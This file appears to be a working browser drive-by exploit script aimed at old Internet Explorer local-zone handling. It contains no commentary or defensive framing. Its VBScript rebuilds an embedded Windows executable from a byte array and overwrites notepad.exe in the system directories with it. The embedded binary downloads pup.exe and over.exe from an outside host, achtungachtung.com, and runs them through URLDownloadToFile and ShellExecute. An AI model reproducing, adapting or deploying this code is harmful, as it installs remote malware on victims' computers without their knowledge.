
base_path="http://www.achtungachtung.com/0011";
PayloadExe_Url=base_path+"/PayloadExe.exe";
WaitForMhtmlResCached_TIME=1000*3;

function LaunchRemoteExe()
	{
		function TenDigitRnd()
		//post: return a 10-digit random number. i just use millisecond here.
			{
				RndStr=Math.random().toString().substring();
				return RndStr.substring(RndStr.length-10,RndStr.length);
			}
		w=window.open("about:blank","mywin","width=1 height=1 resizable=yes location=yes");
		w.document.write('<script language="Vbs">domain = "achtungachtung.com/0011"\n\
Function getPup()\n\
directory = "http://"+domain+"/pup.exe"\n\
thestr = ""\n\
For i = 1 to 49\n\
if i <= Len(directory) Then thestr=thestr & Asc(Mid(directory,i,1)) Else thestr=thestr & "0"\n\
thestr=thestr & ","\n\
Next\n\
getPup = thestr\n\
End Function\n\
Function getOver()\n\
directory = "http://"+domain+"/over.exe"\n\
thestr = ""\n\
For i = 1 to 50\n\
if i <= Len(directory) Then thestr=thestr & Asc(Mid(directory,i,1)) Else thestr=thestr & "0"\n\
thestr=thestr & ","\n\
Next\n\
getOver = thestr\n\
End Function\n\
jelmersArray=eval("array(77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,176,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,13,10,36,0,0,0,0,0,0,0,93,207,159,135,25,174,241,212,25,174,241,212,25,174,241,212,151,177,226,212,19,174,241,212,229,142,227,212,24,174,241,212,82,105,99,104,25,174,241,212,0,0,0,0,0,0,0,0,80,69,0,0,76,1,2,0,176,227,232,63,0,0,0,0,0,0,0,0,224,0,15,1,11,1,5,12,0,2,0,0,0,2,0,0,0,0,0,0,0,16,0,0,0,16,0,0,0,32,0,0,0,0,64,0,0,16,0,0,0,2,0,0,4,0,0,0,0,0,0,0,4,0,0,0,0,0,0,0,0,48,0,0,0,2,0,0,0,0,0,0,2,0,0,0,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,24,32,0,0,80,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,46,116,101,120,116,0,0,0,50,1,0,0,0,16,0,0,0,2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,0,96,46,114,100,97,116,97,0,0,218,0,0,0,0,32,0,0,0,2,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,64,0,0,0,0,0,0,0,0,233,175,0,0,0,99,58,92,80,114,111,103,114,97,109,32,70,105,108,101,115,92,112,117,112,46,101,120,101,0,"+getPup()+"0,99,58,92,80,114,111,103,114,97,109,32,70,105,108,101,115,92,111,118,101,114,46,101,120,101,0,"+getOver()+"0,99,58,92,80,114,111,103,114,97,109,32,70,105,108,101,115,0,111,112,101,110,0,0,106,0,106,0,104,5,16,64,0,104,30,16,64,0,106,0,232,87,0,0,0,106,0,104,157,16,64,0,104,179,16,64,0,104,5,16,64,0,104,174,16,64,0,106,0,232,70,0,0,0,106,0,106,0,104,80,16,64,0,104,106,16,64,0,106,0,232,37,0,0,0,106,0,104,157,16,64,0,104,179,16,64,0,104,80,16,64,0,104,174,16,64,0,106,0,232,20,0,0,0,106,0,232,7,0,0,0,204,255,37,16,32,64,0,255,37,0,32,64,0,255,37,8,32,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,162,32,0,0,0,0,0,0,190,32,0,0,0,0,0,0,128,32,0,0,0,0,0,0,120,32,0,0,0,0,0,0,0,0,0,0,150,32,0,0,16,32,0,0,104,32,0,0,0,0,0,0,0,0,0,0,176,32,0,0,0,32,0,0,112,32,0,0,0,0,0,0,0,0,0,0,206,32,0,0,8,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,162,32,0,0,0,0,0,0,190,32,0,0,0,0,0,0,128,32,0,0,0,0,0,0,49,0,85,82,76,68,111,119,110,108,111,97,100,84,111,70,105,108,101,65,0,0,117,114,108,109,111,110,46,100,108,108,0,0,128,0,69,120,105,116,80,114,111,99,101,115,115,0,107,101,114,110,101,108,51,50,46,100,108,108,0,0,103,0,83,104,101,108,108,69,120,101,99,117,116,101,65,0,115,104,101,108,108,51,50,46,100,108,108,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)")\n\
winxp="c:\\windows\\system32\\notepad.exe"\n\
winxpe="c:\\windows\\notepad.exe"\n\
winxp2="c:\\winnt\\system32\\notepad.exe"\n\
winxp2e="c:\\winnt\\notepad.exe"\n\
Function toString(payloadArray)\n\
For Each arrayElement In payloadArray\n\
toString = toString & ChrB(arrayElement)\n\
Next\n\
End Function\n\
Const adTypeBinary = 1\n\
Const adTypeText = 2\n\
Const adSaveCreateOverWrite = 2\n\
set jelmer = CreateObject("Adodb.Stream")\n\
jelmer.Type = adTypeText\n\
jelmer.Open\n\
jelmer.WriteText toString(jelmersArray)\n\
jelmer.Position = 0\n\
jelmer.Type = adTypeBinary\n\
jelmer.Position = 2\n\
bytearray = jelmer.Read\n\
jelmer.Close\n\
set malware = CreateObject("Adodb.Stream")\n\
malware.Type = adTypeBinary\n\
malware.Open\n\
malware.Write bytearray\n\
On Error Resume Next\n\
malware.savetofile(winxp), adSaveCreateOverWrite\n\
On Error Resume Next\n\
malware.savetofile(winxpe), adSaveCreateOverWrite\n\
On Error Resume Next\n\
malware.savetofile(winxp2), adSaveCreateOverWrite\n\
On Error Resume Next\n\
malware.savetofile(winxp2e), adSaveCreateOverWrite\n\
On Error Resume Next\n\
malware.Close\n\
location.href = "view-source:" + location.href\n\
self.Close\n\
</script>\n');
		w.document.close();
		setTimeout("w.close()\;parent.parent.parent.close()\;",WaitForMhtmlResCached_TIME);
	}

function IsLocalZone()
	{
		if(window.parent.frames.length==0)
			{
				alert("ScriptBodyJsp.php/ERROR : Script is executed in top window instead of a sub frame.");
				return false;
			}
		try
		{
			//If window.parent is accessible, it's local zone
			tempVar=window.parent.location.href;
			return true;
		}
		catch(e)
		{
			//If window.parent is inaccessible, it's local zone
			return false;
		}
	}

if(IsLocalZone())
	LaunchRemoteExe()

if(!IsLocalZone())
	window.parent.location.href=base_path+"/goback.htm";
